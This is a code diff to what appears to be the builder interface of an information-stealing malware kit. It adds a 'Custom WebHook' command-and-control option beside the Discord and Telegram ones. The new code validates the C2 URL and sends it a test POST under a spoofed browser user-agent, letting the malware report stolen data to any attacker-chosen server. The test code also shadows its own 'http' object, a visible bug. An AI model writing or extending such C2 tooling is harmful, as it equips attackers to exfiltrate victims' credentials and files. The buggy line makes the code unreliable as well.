@@ -274,6 +274,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.focus() # Removes focus from the C2 text box
 		DISCORD = "C2: Discord"
 		TELEGRAM = "C2: Telegram"
+		CUSTOM_WEBHOOK = "C2: Custom WebHook"
 
 		discordOnlyCheckBoxes = (
 			(self.pingMeCheckboxControl, self.pingMeVar),
@@ -290,7 +291,13 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 				control.configure(state= "disabled")
 				var.set(False)
 
-		elif self.C2Mode == 1: # Change to Discord
+		elif self.C2Mode == 1: # Change to Custom Web Hook
+			self.C2Mode = 2
+			buttonText = CUSTOM_WEBHOOK;
+			self.C2EntryControl.configure(placeholder_text= "Enter Webhook URL")
+			self.testC2ButtonControl.configure(text= "Test Webhook")
+
+		elif self.C2Mode == 2: # Change to Discord
 			self.C2Mode = 0
 			buttonText = DISCORD
 			self.C2EntryControl.configure(placeholder_text= "Enter Discord Webhook URL")
@@ -535,7 +542,29 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 						messagebox.showwarning("Warning", "Your webhook does not seems to be working!")
 				except Exception:
 					messagebox.showwarning("Warning", "Unable to connect to the webhook!")
-			
+			elif self.C2Mode == 2: #CUstom Webhook
+				webhook = self.C2EntryControl.get().strip()
+				if len(webhook) == 0:
+					messagebox.showerror("Error", "Webhook cannot be empty!")
+					return
+				
+				if any(char.isspace() for char in webhook):
+					messagebox.showerror("Error", "Webhook cannot contain spaces!")
+					return
+				
+				if not webhook.startswith(("http://", "https://")):
+					messagebox.showerror("Error", "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.")
+					return
+				try:
+					data = json.dumps({"content" : "Your webhook is working!"}).encode()
+					http = http.request("POST", webhook, body= data, headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
+					status = http.status
+					if status == 204:
+						messagebox.showinfo("Success", "Your webhook seems to be working!")
+					else:
+						messagebox.showwarning("Warning", "Your webhook does not seems to be working!")
+				except Exception:
+					messagebox.showwarning("Warning", "Unable to connect to the webhook!")
 			elif self.C2Mode == 1:
 				endpoint = self.C2EntryControl.get().strip()
 				if len(endpoint) == 0:
